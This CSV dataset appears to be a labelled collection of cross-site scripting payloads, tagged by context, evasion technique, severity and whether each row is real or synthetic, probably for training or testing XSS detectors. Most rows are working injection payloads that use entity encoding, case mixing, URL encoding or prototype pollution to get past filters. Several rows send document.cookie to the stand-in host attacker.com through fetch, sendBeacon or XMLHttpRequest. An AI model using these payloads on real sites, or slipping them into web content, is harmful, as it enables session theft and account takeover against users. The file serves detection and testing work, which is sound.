payload,context,technique,severity,length,source
"<tt draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</tt>",tag_injection,none,medium,62,real
"<frameset draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</frameset>",tag_injection,none,medium,89,real
'><img src=x onwh&#101;&#101;l=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,low,71,synthetic
%22 ><svg onwebkitfullscreenchange=alert(%27XSS%27)>,attribute_escape,synthetic,medium,52,synthetic
OnwEbkIttRanSitIonEnd=alErt&#40;lOcaTioN.hAsh&#41;,event_handler,synthetic,low,50,synthetic
<input2 onpointerenter=alert(1) style=display:block>AnonKryptiQuz</input2>,tag_injection,none,medium,74,real
<button	ondragenter=alert(location.hash)>,tag_injection,synthetic,medium,41,synthetic
__proto__[%22onpointerrawupdate%22]=fetch(document.domain),dom_sink,synthetic,high,58,synthetic
<!--><AniMatEtrAnsForM oNpoIntErdOwn=prOmpT(1)>,tag_injection,synthetic,medium,47,synthetic
<!--><obj&#101;ct onw&#101;bkit&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,95,synthetic
"onp&#97;st&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,63,synthetic
"' ><svg onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,76,synthetic
"""><t&#97;bl&#101; ons&#101;l&#101;ct=prompt(1)>",tag_injection,synthetic,medium,47,synthetic
&quot; onk&#101;ydown=prompt('XSS') x=&quot;,attribute_escape,synthetic,medium,44,synthetic
" onkeydown=\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,52,synthetic
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=XMLHttpRequest(navigator.sendBeacon('//attacker.com',document.cookie))>"")",dom_sink,synthetic,high,132,synthetic
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=fetch(%27//attacker.com/?c=%27+document.cookie)>%22)",dom_sink,synthetic,high,117,synthetic
<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>,tag_injection,none,medium,46,real
"<div id=""118""><div draggable=""true"" ondragstart=""event.dataTransfer.setData('text/plain','malicious code');""><h1>Drop me</h1></div>",tag_injection,none,low,131,real
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=prompt(navigator.sendBeacon(%27//attacker.com%27,document.cookie))>%22)",dom_sink,synthetic,high,136,synthetic
"OnpAstE=pRomPt(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,45,synthetic
"<fieldset draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</fieldset>",tag_injection,none,medium,74,real
"<style>:target {color:red;}</style><rp id=x style=""transition:color 1s"" ontransitionstart=alert(1)></rp>",tag_injection,none,medium,104,real
%3Clink x=y ondrop=prompt(document.domain)%3E,tag_injection,synthetic,medium,45,synthetic
{&#97;l&#101;rt docum&#101;nt.cooki&#101;},template_injection,synthetic,low,42,synthetic
"OnpRomPtdIsmIss=coNsoLe.Log/**/(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,62,synthetic
%22%3E%3Cimg%20src=x%20onerror=confirm%281%29;%3E,event_handler,url_encoding,low,49,real
"'%3E%3Cimg src=x onanimationend=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,73,synthetic
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:confirm(docum&#101;nt.dom&#97;in)""",dom_sink,synthetic,medium,77,synthetic
"<style>:target {color:red;}</style><ul id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></ul>",tag_injection,none,medium,108,real
<a2 onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</a2>,tag_injection,none,medium,70,real
"' oNtoUchStaRt=ConFirM(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,high,55,synthetic
"<noembed onmouseover=""alert(1)"">AnonKryptiQuz</noembed>",tag_injection,none,medium,55,real
"<colgroup onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</colgroup>",tag_injection,none,medium,72,real
%27><script>console.log(1)</script>,script_injection,synthetic,medium,35,synthetic
' ><svg onb&#101;for&#101;p&#97;st&#101;=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,59,synthetic
<td id=x tabindex=1 onfocusin=alert(1)></td>,tag_injection,none,medium,44,real
\' OnbEfoRecUt=AleRt(DocUmeNt.DomAin)//,attribute_escape,synthetic,medium,39,synthetic
"""%3E%3Cdetails onrepeat=prompt(1)%3E",tag_injection,synthetic,medium,36,synthetic
"setTimeout(%22alert(1)%22,0)",dom_sink,synthetic,medium,28,synthetic
<audio onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
&quot; onfocusin=consol&#101;.log(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,low,65,synthetic
"<address onmouseleave=""alert(1)"">AnonKryptiQuz</address>",tag_injection,none,medium,56,real
"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></slot>",tag_injection,none,medium,112,real
<baSe/OnpOinTerUp=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,39,synthetic
""" ><svg onstalled=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
<form onw&#101;bkittr&#97;nsition&#101;nd=prompt(loc&#97;tion.h&#97;sh) onw&#101;bkittr&#97;nsition&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,138,synthetic
{{constructor['constructor']('confirm(docum&#101;nt.dom&#97;in)')()}},template_injection,synthetic,medium,69,synthetic
"`%3E%3Cimg src=x onbeforepaste=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,71,synthetic
"<small oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99,real
"<form onmouseleave=""alert(1)"">AnonKryptiQuz</form>",tag_injection,none,medium,50,real
"`><img src=x onreset=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
"<style>@keyframes x{}</style><base style=""animation-name:x"" onanimationend=""alert(1)""></base>",tag_injection,none,medium,93,real
"\"" OngEstUreEnd=alErt(1)//",attribute_escape,synthetic,medium,26,synthetic
'><img src=x onstalled=prompt(1)>,attribute_escape,synthetic,medium,33,synthetic
<table onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</table>,tag_injection,none,medium,76,real
<m&#97;th onscroll&#101;nd=prompt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,60,synthetic
<!--><template ondragenter=\u0061lert('XSS')>,tag_injection,synthetic,low,45,synthetic
`%3E%3Cimg src=x onkeydown=prompt('XSS')%3E,attribute_escape,synthetic,medium,43,synthetic
%3Csource/oninput=alert(location.hash)%3E,tag_injection,synthetic,medium,41,synthetic
"<progress onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",tag_injection,none,medium,77,real
<svg><tfoot onload=alert(1)></tfoot>,tag_injection,none,medium,36,real
<img2 onpointerup=alert(1) style=display:block>AnonKryptiQuz</img2>,tag_injection,none,medium,67,real
onmouseover=console.log&#40;1&#41;,event_handler,synthetic,low,34,synthetic
"""><form onr&#101;s&#101;t=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,low,69,synthetic
"<style>@keyframes slidein {}</style><br style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></br>",tag_injection,none,medium,164,real
%3Cdialog	onstalled=confirm('XSS')%3E,tag_injection,synthetic,medium,37,synthetic
\' onwebkitanimationend=prompt(1)//,attribute_escape,synthetic,medium,35,synthetic
"location.href=%22javascript:prompt(String.fromCharCode(88,83,83))%22",dom_sink,synthetic,high,68,synthetic
`><img src=x onmous&#101;wh&#101;&#101;l=prompt('XSS')>,attribute_escape,synthetic,medium,55,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""prompt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""",dom_sink,synthetic,medium,176,synthetic
"<xmP oNfoCusOut=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,high,54,synthetic
"""><Set onPoiNteRmoVe=ConFirM(lOcaTioN.hAsh)>",tag_injection,synthetic,medium,44,synthetic
"ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",js_uri,none,medium,64,real
onpointermove=alert/***/(document.domain),event_handler,synthetic,low,41,synthetic
oninput=javascript:alert(1),event_handler,synthetic,medium,27,synthetic
ontouchmove=javascr	ipt:confirm(location.hash),event_handler,synthetic,medium,46,synthetic
"setInterval(%22XMLHttpRequest(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22,100)",dom_sink,synthetic,high,97,synthetic
&quot; ondr&#97;g&#101;nt&#101;r=consol&#101;.log(1) x=&quot;,attribute_escape,synthetic,low,61,synthetic
OnmOzfUllScrEenChaNge=prOmpT('XSS'),event_handler,synthetic,medium,35,synthetic
<!--><s&#101;l&#101;ct onpoint&#101;rmov&#101;=prompt('XSS')>,tag_injection,synthetic,medium,61,synthetic
\%27 ongotpointercapture=prompt(%27XSS%27)//,attribute_escape,synthetic,medium,44,synthetic
"%3Cplaintext
onpause=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,66,synthetic
%3Cbase onkeydown=alert('XSS') onkeydown=alert('XSS')%3E,tag_injection,synthetic,medium,56,synthetic
"%22 ><svg onanimationiteration=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,74,synthetic
"%22><img src=x onpointerover=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,72,synthetic
__proto__[%22oncanplay%22]=alert(%27//attacker.com/?c=%27+document.cookie),dom_sink,synthetic,high,74,synthetic
"<audio onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></audio>",tag_injection,none,medium,283,real
	onhashchange=console.log(location.hash),event_handler,synthetic,medium,40,synthetic
"<dl onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</dl>",tag_injection,none,medium,60,real
"\"" onclose=alert(document.domain)//",attribute_escape,synthetic,medium,35,synthetic
' onpointermove=prompt('XSS') ',attribute_escape,synthetic,medium,31,synthetic
"<shadow onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</shadow>",tag_injection,none,medium,73,real
%27 onanimationiteration=confirm(%27XSS%27) %27,attribute_escape,synthetic,medium,47,synthetic
"<DIV STYLE=""background-image: url(javascript:alert('AnonKryptiQuz'))"">",js_uri,case_variation,medium,71,real
onblur=&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,47,synthetic
"<IMG SRC=x onkeyup=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,58,real
"&lt;TABLE BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",generic,html_entity,medium,57,real
%3Cdialog src=x onpagehide=console.log(1)%3E,tag_injection,synthetic,medium,44,synthetic
"<select
onanimationstart=prompt('XSS')>",tag_injection,synthetic,medium,39,synthetic
"<style>@keyframes x{}</style><i style=""animation-name:x"" onwebkitanimationend=""alert(1)""></i>",tag_injection,none,medium,93,real
"`%3E%3Cimg src=x onvolumechange=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,72,synthetic
"<video autoplay controls onwaiting=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",tag_injection,none,medium,96,real
%22><img src=x oncopy=console.log(1)>,attribute_escape,synthetic,medium,37,synthetic
"%22 onpointerup=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,58,synthetic
"<marquee ondblclick=""alert(1)"">AnonKryptiQuz</marquee>",tag_injection,none,medium,54,real
\' onbeforepaste=confirm(document.domain)//,attribute_escape,synthetic,medium,43,synthetic
""" oNseArcH=pRomPt(LocAtiOn.HasH) """,attribute_escape,synthetic,medium,34,synthetic
"'%3E%3Cimg src=x onanimationcancel=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,74,synthetic
"EvaL(""ConFirM(STriNg.FroMChArCOde(88,83,83))"")",dom_sink,synthetic,high,46,synthetic
"<slot onmouseenter=""alert(1)"">AnonKryptiQuz</slot>",tag_injection,none,medium,50,real
' onbeforetoggle=console.log('XSS') ',attribute_escape,synthetic,medium,37,synthetic
"\' oninvalid=prompt(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,52,synthetic
 onpointerup=prompt(document.domain),event_handler,synthetic,medium,36,synthetic
<img onerror=a&#x06c;ert(1) src=a>,tag_injection,html_entity,low,34,real
__proto__[%22onbeforetoggle%22]=XMLHttpRequest(document.domain),dom_sink,synthetic,high,63,synthetic
"<m&#97;rqu&#101;&#101;
on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,68,synthetic
<template onreset=\u0061lert(location.hash)>,tag_injection,synthetic,low,44,synthetic
"__proto__[""onend""]=prompt(document.domain)",dom_sink,synthetic,medium,42,synthetic
<set onclose=confirm(document.domain)/>,tag_injection,synthetic,medium,39,synthetic
"\"" onc&#97;npl&#97;y=consol&#101;.log(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,low,62,synthetic
<iframe onsecuritypolicyviolation=confirm(%27XSS%27) onsecuritypolicyviolation=confirm(%27XSS%27)>,tag_injection,synthetic,medium,98,synthetic
<hgroup onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
"'><Img srC=x onTouChsTarT=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""prOmpT(bToa(doCumEnt.coOkiE))""",dom_sink,synthetic,high,73,synthetic
"ongotpointercapture=javascr	ipt:alert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,68,synthetic
"%3Cscript%3EFunction('console.log(String.fromCharCode(88,83,83))')();%3C/script%3E",script_injection,synthetic,high,82,synthetic
<td	onkeyup=confirm(document.domain)>,tag_injection,synthetic,medium,37,synthetic
"<li draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</li>",tag_injection,none,medium,57,real
<spacer onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</spacer>,tag_injection,none,medium,78,real
"<if expr=""new ActiveXObject('htmlfile').parentWindow.alert(2)""></if>",dom_sink,none,medium,68,real
onpointermove=\u0061lert('XSS'),event_handler,synthetic,low,31,synthetic
"<script
>confirm(document.domain)</script>",script_injection,synthetic,medium,42,synthetic
"<!--><vid&#101;o onp&#97;st&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,89,synthetic
"""&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;img src=x onerror=prompt(document.domain);&amp;amp;amp;amp;gt;",dom_sink,none,medium,103,real
{{prompt(document.cookie)}},template_injection,synthetic,high,27,synthetic
' %3E%3Csvg onclose=console.log(location.hash)%3E,attribute_escape,synthetic,medium,49,synthetic
""" ><svg onfocus=alert(1)>",attribute_escape,synthetic,medium,25,synthetic
' ><svg onfocusout=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,low,57,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",tag_injection,none,medium,184,real
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=alert(document.cookie)>"")",dom_sink,synthetic,high,84,synthetic
<&#97;r&#101;&#97; onp&#97;g&#101;show=prompt('XSS') onp&#97;g&#101;show=prompt('XSS')>,tag_injection,synthetic,medium,87,synthetic
eval(%22fetch(document.domain)%22),dom_sink,synthetic,high,34,synthetic
	onpointerup=prompt(location.hash),event_handler,synthetic,medium,34,synthetic
<nextid contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,60,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=confirm(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink,synthetic,medium,118,synthetic
onprompt&#97;ction=confirm(1),event_handler,synthetic,medium,29,synthetic
"<option oncut=""alert(1)"" contenteditable>AnonKryptiQuz</option>",tag_injection,none,medium,63,real
'><img src=x ondrop=prompt('XSS')>,attribute_escape,synthetic,medium,34,synthetic
ontransitionstart=javascr	ipt:prompt(location.hash),event_handler,synthetic,medium,51,synthetic
%27 onsecuritypolicyviolation=console.log(document.domain) %27,attribute_escape,synthetic,medium,62,synthetic
"&#101;v&#97;l(""prompt(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink,synthetic,medium,63,synthetic
'><img src=x onended=alert('XSS')>,attribute_escape,synthetic,medium,34,synthetic
"<a href=""jav&#65ascript:javascript:alert(1)"">test1</a>",js_uri,html_entity,medium,54,real
\' onmousedown=alert(location.hash)//,attribute_escape,synthetic,medium,37,synthetic
"<font onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</font>",tag_injection,none,medium,67,real
'%3E%3Cimg src=x ontouchmove=console.log(document.domain)%3E,attribute_escape,synthetic,medium,60,synthetic
"<style>:target {color: red;}</style><audio id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></audio>",tag_injection,none,medium,113,real
"""><Img srC=x onGesTurEenD=cOnsOle.loG(lOcaTioN.hAsh)>",attribute_escape,synthetic,medium,53,synthetic
"<meta
ontransitionstart=alert(location.hash)>",tag_injection,synthetic,medium,45,synthetic
<tfoot onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"setTimeout(%22eval(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22,0)",dom_sink,synthetic,high,84,synthetic
"%3Cscript%3E/*/alert(String.fromCharCode(88,83,83))%3C/script%3E",script_injection,synthetic,high,64,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)""",dom_sink,synthetic,high,151,synthetic
"&quot; ontransitionrun=console.log(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,74,synthetic
<noembed id=x tabindex=1 onfocusin=alert(1)></noembed>,tag_injection,none,medium,54,real
%3Cbody	oninvalid=alert(location.hash)%3E,tag_injection,synthetic,medium,41,synthetic
"%22><img src=x onmozfullscreenchange=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,74,synthetic
<dd onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
"<strong onmouseleave=""alert(1)"">AnonKryptiQuz</strong>",tag_injection,none,medium,54,real
"<div draggable=""true"" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable style=display:block>drop here</dd>",tag_injection,none,medium,121,real
<script>{onerror=alert}throw 1</script>,script_injection,none,low,39,real
&quot; onpromptaction=console.log('XSS') x=&quot;,attribute_escape,synthetic,medium,49,synthetic
"<nextid onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</nextid>",tag_injection,none,medium,71,real
<plAinTexT sRc=X oNrePeaT=pRomPt('XSS')>,tag_injection,synthetic,medium,40,synthetic
"<nobr oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,98,real
<scRipT>//coNsoLe.Log('XSS')</ScrIpt>,script_injection,synthetic,medium,37,synthetic
"<shadow ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</shadow>",tag_injection,none,medium,93,real
"<font ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</font>",tag_injection,none,medium,89,real
%3Cscript%3Ewindow['prompt'](1)%3C/script%3E,script_injection,synthetic,low,44,synthetic
"""%3E%3Cimg src=x onbeforematch=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,71,synthetic
`><Img srC=x onWheEl=ProMpt(loCatIon.haSh)>,attribute_escape,synthetic,medium,43,synthetic
<s&#101;l&#101;ct x=y ons&#101;curitypolicyviol&#97;tion=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,88,synthetic
"window[""XMLHttpR&#101;qu&#101;st""](1)",dom_sink,synthetic,high,37,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style=""position:absolute;"" onanimationcancel=""print()""></audio>",tag_injection,none,low,179,real
"<h1 onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</h1>",tag_injection,none,medium,65,real
"""><img src=x onmousedown=confirm(1)>",attribute_escape,synthetic,medium,36,synthetic
<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>,tag_injection,none,medium,58,real
"<image3 onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</image3>",tag_injection,none,medium,85,real
"	onpageshow=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,49,synthetic
<td	onsubmit=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,47,synthetic
<noscript contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,62,real
"<animatetransform oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,109,real
<blInk onMouSeuP=aLerT(1)>,tag_injection,synthetic,medium,26,synthetic
""" %3E%3Csvg onpointerup=prompt(location.hash)%3E",attribute_escape,synthetic,medium,48,synthetic
%3Cobject/onbeforepaste=confirm(document.domain)%3E,tag_injection,synthetic,medium,51,synthetic
' ><svg onfocusin=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,low,58,synthetic
"' oNbeForEmaTch=prOmpT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,high,55,synthetic
"<plaintext draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</plaintext>",tag_injection,none,medium,96,real
%27><img src=x ondragenter=prompt(document.domain)>,attribute_escape,synthetic,medium,51,synthetic
"""><a href=jav&#x0D;ascript&colon;top[8680439..toString(30)](document.domain)>Click</a>",dom_sink,html_entity|whitespace_obfuscation,low,86,real
\' onreset=alert('XSS')//,attribute_escape,synthetic,medium,25,synthetic
<img src=x onerror=alert(document.domain)>,dom_sink,none,medium,42,real
"<frame onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></frame>",tag_injection,none,medium,283,real
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=aLerT(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))>"")",dom_sink,synthetic,high,123,synthetic
""" oNtrAnsItiOneNd=ProMpt(loCatIon.haSh) """,attribute_escape,synthetic,medium,41,synthetic
"""><IfrAme onInpUt=ConSolE.lOg(LocAtiOn.HasH)>",tag_injection,synthetic,medium,45,synthetic
	onFocUsiN=cOnfIrm(doCumEnt.doMaiN),event_handler,synthetic,medium,35,synthetic
	oninput=prompt('XSS'),event_handler,synthetic,medium,22,synthetic
"<style>@keyframes slidein {}</style><video2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></video2>",tag_injection,none,medium,172,real
`><Img srC=x onPasTe=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,50,synthetic
<blockquote onpointerover=alert(1) style=display:block>AnonKryptiQuz</blockquote>,tag_injection,none,medium,81,real
{{alert(%27XSS%27)}},template_injection,synthetic,medium,20,synthetic
<samp onblur=alert(1) tabindex=1 id=x></samp><input autofocus>,tag_injection,none,medium,62,real
<anImaTemOtiOn	OndRop=coNfiRm(LocAtiOn.HasH)>,tag_injection,synthetic,medium,45,synthetic
"""><Img srC=x onCopY=cOnsOle.loG(1)>",attribute_escape,synthetic,medium,35,synthetic
"<figure ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</figure>",tag_injection,none,medium,93,real
%22 ><svg onerror=console.log(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
onstalled=\u0061lert/**/(document.domain),event_handler,synthetic,low,41,synthetic
ontr&#97;nsitionrun=confirm/**/(1),event_handler,synthetic,low,34,synthetic
${cOnfIrm(doCumEnt.coOkiE)},template_injection,synthetic,high,27,synthetic
"<head onbeforecut=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</head>",tag_injection,none,medium,85,real
' ><svg onmousewheel=alert(1)>,attribute_escape,synthetic,medium,30,synthetic
"SetIntErvAl(""XMLHtTpREquEst(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)"",100)",dom_sink,synthetic,high,72,synthetic
<tbody onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</tbody><input value=clickme>,tag_injection,none,medium,110,real
JavAscRipT:aLerT(lOcaTioN.hAsh),js_uri,synthetic,medium,31,synthetic
<menuitem onpointerover=alert(1) style=display:block>AnonKryptiQuz</menuitem>,tag_injection,none,medium,77,real
<scr	ipt onclick=prompt('XSS')>,tag_injection,synthetic,medium,31,synthetic
<%= alErt 'XSS' %>,template_injection,synthetic,low,18,synthetic
"\"" OnrEseT=aLerT('XSS')//",attribute_escape,synthetic,medium,25,synthetic
javascript:alert(1);/////,js_uri,none,medium,25,real
"<address oncontextmenu=""alert(1)"">AnonKryptiQuz</address>",tag_injection,none,medium,57,real
"<meta onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</meta>",tag_injection,none,medium,69,real
<marquee x=y onkeydown=confirm(1)>,tag_injection,synthetic,medium,34,synthetic
"<style>:target {transform: rotate(180deg);}</style><embed id=x style=""transition:transform 2s"" ontransitionrun=print()></embed>",tag_injection,none,low,127,real
"<SCRIPT>document.write(""XSS"");</SCRIPT>",dom_sink,case_variation,low,39,real
&quot; on&#101;nd=consol&#101;.log('XSS') x=&quot;,attribute_escape,synthetic,low,50,synthetic
"<th draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</th>",tag_injection,none,medium,60,real
'><img src=x onmozfullscreenchange=\u0061lert(1)>,attribute_escape,synthetic,low,49,synthetic
"(n&#101;w Function(""confirm('XSS')""))();",dom_sink,synthetic,medium,40,synthetic
"""%3E%3Cimg src=x ontouchmove=prompt(1)%3E",attribute_escape,synthetic,medium,41,synthetic
"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(1)"">",tag_injection,none,medium,46,real
<a onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</a><input value=clickme>,tag_injection,none,medium,102,real
""" %3E%3Csvg onpointerdown=alert(document.domain)%3E",attribute_escape,synthetic,medium,51,synthetic
<element id=x tabindex=1 onfocus=alert(1)></element>,tag_injection,none,medium,52,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink,synthetic,high,135,synthetic
